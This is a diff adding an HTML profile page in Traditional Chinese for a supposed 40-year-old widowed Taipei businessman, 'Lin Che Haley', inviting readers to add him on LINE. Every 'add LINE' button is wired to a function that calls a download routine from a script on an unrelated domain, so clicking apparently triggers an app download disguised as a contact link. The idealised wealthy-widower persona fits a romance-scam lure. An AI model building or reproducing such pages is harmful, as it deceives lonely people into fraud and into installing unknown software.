@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#f6f1e7">
+<title>林哲 Haley｜台北・40歲・把日子過成自己喜歡的樣子</title>
+<meta name="description" content="我是林哲，40歲，台北人。新加坡國立大學金融系畢業，做過投資顧問，也創過業。走過低谷，更懂得珍惜。期待在這裡遇見認真的你。">
+
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+   
+   
+<script>
+/* 统一行动号召方法：页面所有 CTA 按钮均调用 k2() */
+function k2(){
+  MeetU.download(event);
+}
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+TC:wght@500;600;700;900&family=Noto+Sans+TC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#1b1712;
+    --ink-soft:#5d5648;
+    --ink-faint:#9a917f;
+    --bg:#f6f1e7;
+    --bg-deep:#efe7d8;
+    --card:#fffdf8;
+    --line:#eae1d1;
+    --line-soft:#f1ebdf;
+    --gold:#b98a45;
+    --gold-deep:#9c7030;
+    --gold-soft:#f3e8d2;
+    --green:#06C755;
+    --green-deep:#04a844;
+    --serif:'Noto Serif TC',"Songti TC","PMingLiU",serif;
+    --sans:'Noto Sans TC',"PingFang TC","Microsoft JhengHei",sans-serif;
+    --radius:20px;
+    --ease:cubic-bezier(.22,1,.36,1);
+    --ease-spring:cubic-bezier(.34,1.4,.4,1);
+    --shadow-sm:0 1px 2px rgba(27,23,18,.04),0 8px 20px rgba(27,23,18,.06);
+    --shadow-md:0 2px 6px rgba(27,23,18,.05),0 20px 44px rgba(27,23,18,.10);
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:var(--sans);
+    background:var(--bg);
+    color:var(--ink);
+    line-height:1.72;
+    font-size:15px;
+    letter-spacing:.02em;
+    -webkit-font-smoothing:antialiased;
+    text-rendering:optimizeLegibility;
+  }
+  ::selection{background:var(--gold);color:#fff;}
+  .page{
+    max-width:520px;margin:0 auto;min-height:100vh;
+    background:var(--bg);
+    box-shadow:0 0 60px rgba(27,23,18,.08);
+    padding-bottom:104px;position:relative;
+  }
+  button{font-family:var(--sans);}
+  button:focus-visible{outline:2px solid var(--gold);outline-offset:2px;}
+
+  /* ---------- Reveal on scroll ---------- */
+  .js .reveal{opacity:0;transform:translateY(20px);transition:opacity .8s var(--ease),transform .8s var(--ease);}
+  .js .reveal.in{opacity:1;transform:none;}
+
+  /* ============================================================
+     HERO — headshot sticker (大头贴) over a softly blurred self
+     ============================================================ */
+  .hero{position:relative;padding:46px 22px 64px;overflow:hidden;}
+  .hero-bg{
+    position:absolute;inset:0;z-index:0;
+    background:url('img/1.jpg') center 22%/cover no-repeat;
+    filter:blur(34px) saturate(1.12);
+    transform:scale(1.2);
+    opacity:.30;
+  }
+  .hero-scrim{
+    position:absolute;inset:0;z-index:1;
+    background:
+      radial-gradient(120% 60% at 50% 0%,rgba(246,241,231,.35) 0%,rgba(246,241,231,.55) 55%,rgba(246,241,231,.92) 100%),
+      linear-gradient(180deg,rgba(246,241,231,.4) 0%,rgba(246,241,231,.18) 40%,rgba(246,241,231,0) 66%,var(--bg) 100%);
+  }
+  .hero-inner{position:relative;z-index:2;text-align:center;}
+
+  /* 大头贴：白圈 + 金环 + 柔和投影，像一枚贴纸 */
+  .avatar{width:122px;height:122px;margin:0 auto;position:relative;}
+  .avatar img{
+    width:100%;height:100%;object-fit:cover;object-position:center 20%;display:block;
+    border-radius:50%;
+    box-shadow:0 0 0 4px #fff,0 0 0 6px rgba(185,138,69,.55),0 0 0 7px rgba(255,255,255,.4),0 18px 40px rgba(27,23,18,.22);
+    transition:transform .7s var(--ease-spring);
+  }
+  .avatar:hover img{transform:scale(1.03);}
+  .avatar .dot{
+    position:absolute;right:5px;bottom:9px;width:23px;height:23px;border-radius:50%;
+    background:var(--green);border:3px solid #fff;box-shadow:0 2px 8px rgba(6,199,85,.45);
+  }
+  .avatar .dot::after{content:"";position:absolute;inset:-5px;border-radius:50%;background:rgba(6,199,85,.16);animation:ping 2.2s var(--ease) infinite;}
+  @keyframes ping{0%{transform:scale(.6);opacity:1;}80%,100%{transform:scale(1.5);opacity:0;}}
+
+  .hero-eyebrow{
+    display:inline-flex;align-items:center;gap:7px;
+    margin-top:20px;padding:5px 13px;border-radius:99px;
+    background:rgba(255,255,255,.72);border:1px solid rgba(185,138,69,.22);
+    font-size:10px;letter-spacing:.26em;font-weight:500;color:var(--gold-deep);
+  }
+  .hero-eyebrow::before{content:"";width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 0 3px rgba(6,199,85,.18);}
+  .hero-name{font-family:var(--serif);font-size:34px;font-weight:900;letter-spacing:.08em;margin-top:14px;line-height:1.15;}
+  .hero-name .en{display:block;font-family:var(--sans);font-size:10px;font-weight:500;letter-spacing:.34em;color:var(--ink-faint);margin-top:5px;}
+  .hero-meta{font-size:13.5px;color:var(--ink-soft);margin-top:9px;letter-spacing:.06em;}
+  .hero-meta b{color:var(--gold-deep);font-weight:600;}
+  .hero-tag{font-size:14.5px;color:var(--ink-soft);line-height:1.9;max-width:330px;margin:13px auto 0;}
+  .hero-chips{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:18px;}
+  .chip{
+    font-size:12px;padding:6px 13px;border-radius:99px;letter-spacing:.05em;color:var(--ink-soft);
+    background:rgba(255,255,255,.8);border:1px solid var(--line);
+    box-shadow:0 1px 2px rgba(27,23,18,.03);
+    transition:transform .4s var(--ease-spring),border-color .4s var(--ease);
+  }
+  .chip:hover{transform:translateY(-2px);border-color:rgba(185,138,69,.4);}
+
+  /* ---------- Stats (floating double-bezel card) ---------- */
+  .stats{
+    position:relative;z-index:3;margin:-34px 16px 8px;
+    background:rgba(255,253,248,.9);border:1px solid rgba(234,225,209,.9);
+    border-radius:var(--radius);box-shadow:var(--shadow-md);overflow:hidden;
+    backdrop-filter:blur(8px);
+  }
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);}
+  .stat{padding:16px 4px;text-align:center;border-right:1px solid var(--line-soft);}
+  .stat:last-child{border-right:none;}
+  .stat b{display:block;font-family:var(--serif);font-size:19px;font-weight:700;color:var(--gold-deep);line-height:1.2;}
+  .stat span{font-size:10.5px;color:var(--ink-faint);letter-spacing:.1em;}
+
+  /* ---------- Sections ---------- */
+  section{padding:30px 20px 0;}
+  .kicker{display:flex;align-items:center;gap:11px;margin-bottom:13px;}
+  .kicker::before{content:"";width:20px;height:2.5px;border-radius:2px;background:linear-gradient(90deg,var(--gold),#e2c288);}
+  .kicker h2{font-family:var(--serif);font-size:21px;font-weight:700;letter-spacing:.06em;line-height:1.2;}
+  .kicker em{
+    font-style:normal;font-size:10px;color:var(--gold-deep);letter-spacing:.22em;margin-left:auto;font-weight:500;
+    padding:4px 10px;border-radius:99px;background:var(--gold-soft);text-transform:uppercase;
+  }
+
+  .lead{font-size:15px;color:var(--ink-soft);line-height:1.9;}
+  .lead p+p{margin-top:11px;}
+  .lead strong{color:var(--gold-deep);font-weight:600;}
+
+  /* id cards — double-bezel */
+  .id-cards{margin-top:18px;display:grid;gap:10px;}
+  .id-card{
+    background:rgba(255,253,248,.92);border:1px solid var(--line);border-radius:var(--radius);
+    padding:13px 16px;display:flex;align-items:center;gap:13px;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.8),var(--shadow-sm);
+    transition:transform .5s var(--ease),box-shadow .5s var(--ease);
+  }
+  .id-card:hover{transform:translateY(-2px);box-shadow:inset 0 1px 0 rgba(255,255,255,.8),var(--shadow-md);}
+  .id-ico{
+    width:42px;height:42px;flex:none;border-radius:13px;background:linear-gradient(150deg,var(--gold-soft),#f8efdf);
+    display:flex;align-items:center;justify-content:center;font-size:20px;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.9),0 2px 6px rgba(185,138,69,.14);
+  }
+  .id-card h4{font-size:10.5px;color:var(--ink-faint);letter-spacing:.16em;font-weight:500;}
+  .id-card p{font-size:14px;font-weight:500;color:var(--ink);line-height:1.5;margin-top:1px;}
+
+  /* ---------- Gallery ---------- */
+  .gallery{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:6px;}
+  .gallery figure{position:relative;aspect-ratio:3/4;border-radius:var(--radius);overflow:hidden;margin:0;box-shadow:var(--shadow-sm);}
+  .gallery img{width:100%;height:100%;object-fit:cover;display:block;transition:transform .8s var(--ease);}
+  .gallery figure:hover img{transform:scale(1.05);}
+  .gallery figcaption{
+    position:absolute;left:0;right:0;bottom:0;padding:24px 13px 10px;font-size:11px;color:#fff;letter-spacing:.1em;
+    background:linear-gradient(180deg,transparent,rgba(15,12,7,.62));
+  }
+
+  /* ---------- Timeline ---------- */
+  .timeline{margin-top:8px;padding-left:4px;}
+  .t-item{position:relative;padding:0 0 19px 25px;border-left:1.5px solid var(--line-soft);}
+  .t-item:last-child{border-left-color:transparent;padding-bottom:4px;}
+  .t-item::before{
+    content:"";position:absolute;left:-6px;top:5px;width:10px;height:10px;border-radius:50%;
+    background:var(--gold);box-shadow:0 0 0 3.5px var(--gold-soft),0 2px 5px rgba(185,138,69,.3);
+  }
+  .t-item .year{display:inline-block;font-family:var(--serif);font-size:12.5px;font-weight:700;color:var(--gold-deep);letter-spacing:.08em;margin-bottom:1px;}
+  .t-item h4{font-size:14.5px;font-weight:600;line-height:1.4;}
+  .t-item p{font-size:13px;color:var(--ink-faint);line-height:1.65;margin-top:2px;}
+
+  /* ---------- Interests ---------- */
+  .hobby{
+    display:grid;grid-template-columns:82px 1fr;gap:14px;align-items:center;
+    background:rgba(255,253,248,.92);border:1px solid var(--line);border-radius:var(--radius);
+    padding:11px 12px 11px 11px;margin-bottom:12px;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.8),var(--shadow-sm);
+    transition:transform .5s var(--ease),box-shadow .5s var(--ease);
+  }
+  .hobby:hover{transform:translateY(-2px);box-shadow:inset 0 1px 0 rgba(255,255,255,.8),var(--shadow-md);}
+  .hobby img{width:82px;height:82px;object-fit:cover;border-radius:15px;box-shadow:inset 0 1px 0 rgba(255,255,255,.5),0 3px 8px rgba(27,23,18,.12);}
+  .hobby h4{font-family:var(--serif);font-size:16.5px;font-weight:700;letter-spacing:.03em;}
+  .hobby h4 span{font-size:9.5px;color:var(--gold-deep);margin-left:7px;letter-spacing:.2em;font-family:var(--sans);font-weight:500;vertical-align:2px;}
+  .hobby p{font-size:12.5px;color:var(--ink-soft);line-height:1.65;margin-top:3px;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden;}
+
+  /* ---------- Quote ---------- */
+  .quote-sec{padding-bottom:8px;}
+  .quote-box{
+    position:relative;overflow:hidden;border-radius:24px;color:#f4ead6;
+    background:
+      radial-gradient(120% 120% at 100% 0%,rgba(185,138,69,.28) 0%,transparent 46%),
+      linear-gradient(150deg,#241e15,#3a3020 58%,#2b241a);
+    padding:30px 24px 26px;
+    box-shadow:0 1px 0 rgba(255,255,255,.06) inset,var(--shadow-md);
+  }
+  .quote-box::before{content:"“";font-family:var(--serif);font-size:120px;line-height:1;color:rgba(230,201,138,.14);position:absolute;top:-16px;left:12px;}
+  .quote-box p{font-size:15px;line-height:2.05;position:relative;}
+  .quote-box .sign{margin-top:16px;text-align:right;font-family:var(--serif);font-size:13.5px;letter-spacing:.18em;color:#e6c98a;}
+
+  /* ---------- CTA ---------- */
+  .cta-card{
+    margin:22px 20px 8px;position:relative;overflow:hidden;
+    background:rgba(255,253,248,.94);border:1px solid var(--line);border-radius:24px;
+    padding:28px 22px 24px;text-align:center;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.8),var(--shadow-md);
+  }
+  .cta-card::before{content:"";position:absolute;inset:0 0 auto 0;height:4px;background:linear-gradient(90deg,var(--gold),#e2c288,var(--gold));}
+  .cta-card h3{font-family:var(--serif);font-size:21px;font-weight:700;letter-spacing:.06em;}
+  .cta-card p{font-size:13px;color:var(--ink-faint);margin:7px 0 18px;}
+  .btn-line{
+    display:inline-flex;align-items:center;justify-content:center;gap:11px;width:100%;max-width:340px;
+    padding:8px 9px 8px 22px;border:none;border-radius:99px;cursor:pointer;color:#fff;
+    background:linear-gradient(135deg,#05bd52,#06C755 55%,#05b74f);
+    font-size:15.5px;font-weight:700;letter-spacing:.12em;
+    box-shadow:0 8px 20px rgba(6,199,85,.32),inset 0 1px 0 rgba(255,255,255,.22);
+    transition:transform .5s var(--ease-spring),box-shadow .5s var(--ease);
+  }
+  .btn-line:hover{transform:translateY(-2px);box-shadow:0 14px 30px rgba(6,199,85,.38),inset 0 1px 0 rgba(255,255,255,.22);}
+  .btn-line:active{transform:scale(.975);}
+  .btn-line .btn-ico{
+    width:34px;height:34px;border-radius:50%;flex:none;
+    background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.3);
+    transition:transform .5s var(--ease-spring);
+  }
+  .btn-line:hover .btn-ico{transform:translateX(2px) rotate(-4deg);}
+  .btn-line svg{width:19px;height:19px;flex:none;}
+  .cta-note{margin-top:13px;font-size:11px;color:var(--ink-faint);letter-spacing:.05em;}
+
+  footer{padding:28px 22px 34px;text-align:center;font-size:11px;color:#b3ab9c;letter-spacing:.06em;line-height:2;}
+
+  /* ---------- Fixed bottom dock ---------- */
+  .dock{position:fixed;left:0;right:0;bottom:0;z-index:20;padding:10px 16px calc(10px + env(safe-area-inset-bottom));background:linear-gradient(180deg,rgba(246,241,231,0),rgba(246,241,231,.88) 30%,var(--bg) 62%);}
+  .dock-inner{max-width:488px;margin:0 auto;}
+  .btn-dock{
+    display:flex;align-items:center;justify-content:center;gap:10px;width:100%;
+    padding:8px 9px 8px 20px;border:none;border-radius:99px;cursor:pointer;color:#fff;
+    background:linear-gradient(135deg,#04b951,#06C755);font-size:16px;font-weight:700;letter-spacing:.12em;
+    box-shadow:0 6px 20px rgba(6,199,85,.4),inset 0 1px 0 rgba(255,255,255,.22);
+    animation:breathe 2.6s var(--ease) infinite;
+  }
+  .btn-dock .btn-ico{width:34px;height:34px;border-radius:50%;flex:none;background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;box-shadow:inset 0 1px 0 rgba(255,255,255,.3);}
+  .btn-dock svg{width:19px;height:19px;flex:none;}
+  @keyframes breathe{
+    0%,100%{transform:scale(1);box-shadow:0 6px 20px rgba(6,199,85,.4),inset 0 1px 0 rgba(255,255,255,.22);}
+    50%{transform:scale(1.03);box-shadow:0 12px 32px rgba(6,199,85,.55),inset 0 1px 0 rgba(255,255,255,.22);}
+  }
+
+  @media (min-width:521px){
+    body{background:#ebe5d8;}
+    .page{border-radius:0;}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none!important;transition:none!important;scroll-behavior:auto!important;}
+    .js .reveal{opacity:1;transform:none;}
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <!-- ═══════ Hero — 大头贴 ═══════ -->
+  <header class="hero">
+    <div class="hero-bg" aria-hidden="true"></div>
+    <div class="hero-scrim" aria-hidden="true"></div>
+    <div class="hero-inner">
+      <div class="avatar">
+        <img src="img/4.jpg" alt="林哲 Haley 頭貼">
+        <span class="dot" aria-hidden="true"></span>
+      </div>
+      <div class="hero-eyebrow">HALEY · TAIPEI</div>
+      <h1 class="hero-name">林哲<span class="en">LIN CHE · HALEY</span></h1>
+      <p class="hero-meta"><b>40 歲</b> · 台北信義區 · 183 cm</p>
+      <p class="hero-tag">把日子過成自己喜歡的樣子，也留一個位置，給還沒出現的你。</p>
+      <div class="hero-chips">
+        <span class="chip">♐ 射手座</span>
+        <span class="chip">✈️ 高端定制旅遊創業</span>
+        <span class="chip">📈 金融顧問出身</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ═══════ Stats ═══════ -->
+  <div class="stats">
+    <div class="stat"><b>40</b><span>年齡</span></div>
+    <div class="stat"><b>183</b><span>身高 cm</span></div>
+    <div class="stat"><b>85</b><span>體重 kg</span></div>
+    <div class="stat"><b>台北</b><span>現居信義</span></div>
+  </div>
+
+  <!-- ═══════ 關於我 ═══════ -->
+  <section class="reveal">
+    <div class="kicker"><h2>關於我</h2><em>About</em></div>
+    <div class="lead">
+      <p>你好，我是林哲，朋友都叫我 <strong>Haley</strong>。1985 年冬天出生在台北，小時候在爺爺奶奶身邊長大，學會的第一件事是陪奶奶挑菜、看爺爺備料——後來才明白，那是我這輩子最踏實的底色。</p>
+      <p>大學讀的是新加坡國立大學應用金融，回台灣服完兵役後進了富邦銀行做投資顧問，再後來自己創業。現在手上管著一家高端定制旅行社，也經營烤肉店。事業說大不大，但每一分都是自己一步步走出來的。</p>
+    </div>
+    <div class="id-cards">
+      <div class="id-card"><div class="id-ico">🎓</div><div><h4>學歷</h4><p>新加坡國立大學・商科金融系（應用金融 MAF）</p></div></div>
+      <div class="id-card"><div class="id-ico">✈️</div><div><h4>事業</h4><p>晴天旅遊執行董事・老乾杯台灣區代理（6 家門市）</p></div></div>
+      <div class="id-card"><div class="id-ico">🏙️</div><div><h4>現居</h4><p>台北市信義區・信義計畫區核心地段</p></div></div>
+      <div class="id-card"><div class="id-ico">🀄</div><div><h4>星座／血型</h4><p>射手座（Sagittarius）・A 型・屬牛</p></div></div>
+    </div>
+  </section>
+
+  <!-- ═══════ 生活剪影 ═══════ -->
+  <section class="reveal">
+    <div class="kicker"><h2>生活剪影</h2><em>Moments</em></div>
+    <div class="gallery">
+      <figure><img src="img/2.jpg" alt="出差路上"><figcaption>出差路上</figcaption></figure>
+      <figure><img src="img/3.jpg" alt="城市夜色"><figcaption>城市夜色</figcaption></figure>
+      <figure><img src="img/4.jpg" alt="黃昏時分"><figcaption>黃昏時分</figcaption></figure>
+      <figure><img src="img/5.jpg" alt="正式場合"><figcaption>正式場合</figcaption></figure>
+    </div>
+  </section>
+
+  <!-- ═══════ 走過的路 ═══════ -->
+  <section class="reveal">
+    <div class="kicker"><h2>我走過的路</h2><em>My Journey</em></div>
+    <div class="timeline">
+      <div class="t-item"><span class="year">2003 – 2007</span><h4>新加坡國立大學求學</h4><p>和當時的女朋友、後來的妻子一起拚雅思、一起留學，是她陪我走出少年時最暗的那段路。</p></div>
+      <div class="t-item"><span class="year">2007 – 2008</span><h4>回台服兵役・陸軍步兵</h4><p>在外島金門服役一年，學會了紀律，也學會了什麼叫責任。</p></div>
+      <div class="t-item"><span class="year">2010</span><h4>富邦銀行投資顧問</h4><p>一年內升上部長，看懂了金融的本質，也看懂了自己想走的路。</p></div>
+      <div class="t-item"><span class="year">2012 – 2014</span><h4>第一次創業・電商</h4><p>賺到第一桶金，也摔了最重的一跤。團隊的問題、賠償的壓力，教會我敬畏市場。</p></div>
+      <div class="t-item"><span class="year">2015 – 2017</span><h4>注資旅行社・加盟老乾杯</h4><p>重新站起來。旅行社做到年營業額八億台幣，烤肉店一年開了四家分店。</p></div>
+      <div class="t-item"><span class="year">2019 – 2020</span><h4>失去摯愛・人生低谷</h4><p>妻子在疫情中離開了我，事業也被疫情逼到瀕臨破產。我選擇不裁員、抵押房子扛下所有——男人該扛的，就要扛。</p></div>
+      <div class="t-item"><span class="year">現在</span><h4>穩定前行，把日子過好</h4><p>事業回到正軌，心也慢慢安頓下來。剩下的，想把生活過得有溫度。</p></div>
+    </div>
+  </section>
+
+  <!-- ═══════ 興趣 ═══════ -->
+  <section class="reveal">
+    <div class="kicker"><h2>工作之外</h2><em>Interests</em></div>
+    <div class="hobby">
+      <img src="img/3.jpg" alt="旅行">
+      <div><h4>旅行<span>TRAVEL</span></h4><p>荷蘭羊角村的清晨濃霧、紐西蘭特卡波湖的南十字星、南極的冰川——旅行教會我在安靜裡找回自己。</p></div>
+    </div>
+    <div class="hobby">
+      <img src="img/5.jpg" alt="紅酒">
+      <div><h4>紅酒<span>WINE</span></h4><p>從喝不慣苦澀，到品出苦後回甘。最常喝黑皮諾和拉菲，睡前一杯，像在品味自己的人生。</p></div>
+    </div>
+    <div class="hobby">
+      <img src="img/4.jpg" alt="騎馬">
+      <div><h4>騎馬<span>RIDING</span></h4><p>退伍後朋友帶我上了陽明山馬會，現在馬就養在俱樂部裡。心情不好的時候騎一圈，煩惱就散了。</p></div>
+    </div>
+    <div class="hobby">
+      <img src="img/2.jpg" alt="做飯">
+      <div><h4>做飯<span>COOKING</span></h4><p>奶奶說，看到愛的人吃自己做的飯時露出幸福表情，就是她的幸福。這句話我記到現在。</p></div>
+    </div>
+  </section>
+
+  <!-- ═══════ 想對你說 ═══════ -->
+  <section class="quote-sec reveal">
+    <div class="kicker"><h2>想對你說</h2><em>To You</em></div>
+    <div class="quote-box">
+      <p>走過山巔，也墜入過低谷，這些年最學會的一件事，是珍惜。<br>
+      我不抽菸、生活規律，情緒穩定，該扛的責任從不推脫。週末喜歡自己去馬場跑一圈，晚上開一瓶紅酒，配一頓自己做的飯。<br>
+      如果你也認真地在找一個能好好說話、好好過日子的人——希望下一個故事裡，有你。</p>
+      <div class="sign">—— 林哲 Haley・台北</div>
+    </div>
+  </section>
+
+  <!-- ═══════ CTA ═══════ -->
+  <div class="cta-card reveal">
+    <h3>來加我的 LINE 吧</h3>
+    <p>平時工作忙，但你的訊息我一定會回。</p>
+    <button class="btn-line" onclick="k2()">
+      加入我的 LINE
+      <span class="btn-ico">
+        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2C6.2 2 1.5 5.99 1.5 10.9c0 4.42 3.65 8.02 8.58 8.76.34.07.8.23.92.52.1.27.07.68.03.95l-.15.89c-.04.27-.21 1.06.93.58s6.15-3.62 8.39-6.2c1.55-1.7 2.8-3.36 2.8-5.5C22.5 5.99 17.8 2 12 2zM7.44 13.6H5.22a.55.55 0 0 1-.55-.55V8.66a.55.55 0 0 1 1.1 0v3.84h1.67a.55.55 0 0 1 0 1.1zm2.2-.55a.55.55 0 0 1-1.1 0V8.66a.55.55 0 0 1 1.1 0v4.39zm5.13 0a.55.55 0 0 1-.99.33l-2.33-3.17v2.84a.55.55 0 0 1-1.1 0V8.66a.55.55 0 0 1 .99-.33l2.33 3.17V8.66a.55.55 0 0 1 1.1 0v4.39zm3.5-2.75a.55.55 0 0 1 0 1.1h-1.67v1.1h1.67a.55.55 0 0 1 0 1.1h-2.22a.55.55 0 0 1-.55-.55V8.66a.55.55 0 0 1 .55-.55h2.22a.55.55 0 0 1 0 1.1h-1.67v1.09h1.67z"/></svg>
+      </span>
+    </button>
+    <div class="cta-note">點擊即可添加 · 期待與你認識</div>
+  </div>
+
+  <footer>
+    林哲 Haley · Taipei, Taiwan<br>
+    認真生活，認真等待 · 感謝你讀到這裡
+  </footer>
+</div>
+
+<!-- ═══════ 底部固定悬浮按钮 ═══════ -->
+<div class="dock">
+  <div class="dock-inner">
+    <button class="btn-dock" onclick="k2()">
+      加 LINE 聊聊
+      <span class="btn-ico">
+        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2C6.2 2 1.5 5.99 1.5 10.9c0 4.42 3.65 8.02 8.58 8.76.34.07.8.23.92.52.1.27.07.68.03.95l-.15.89c-.04.27-.21 1.06.93.58s6.15-3.62 8.39-6.2c1.55-1.7 2.8-3.36 2.8-5.5C22.5 5.99 17.8 2 12 2zM7.44 13.6H5.22a.55.55 0 0 1-.55-.55V8.66a.55.55 0 0 1 1.1 0v3.84h1.67a.55.55 0 0 1 0 1.1zm2.2-.55a.55.55 0 0 1-1.1 0V8.66a.55.55 0 0 1 1.1 0v4.39zm5.13 0a.55.55 0 0 1-.99.33l-2.33-3.17v2.84a.55.55 0 0 1-1.1 0V8.66a.55.55 0 0 1 .99-.33l2.33 3.17V8.66a.55.55 0 0 1 1.1 0v4.39zm3.5-2.75a.55.55 0 0 1 0 1.1h-1.67v1.1h1.67a.55.55 0 0 1 0 1.1h-2.22a.55.55 0 0 1-.55-.55V8.66a.55.55 0 0 1 .55-.55h2.22a.55.55 0 0 1 0 1.1h-1.67v1.09h1.67z"/></svg>
+      </span>
+    </button>
+  </div>
+</div>
+
+<script>
+(function(){
+  document.documentElement.classList.add('js');
+  if(!('IntersectionObserver' in window)){return;}
+  var io=new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}
+    });
+  },{threshold:.12,rootMargin:'0px 0px -6% 0px'});
+  document.querySelectorAll('.reveal').forEach(function(el){io.observe(el);});
+})();
+</script>
+
+</body>
+</html>
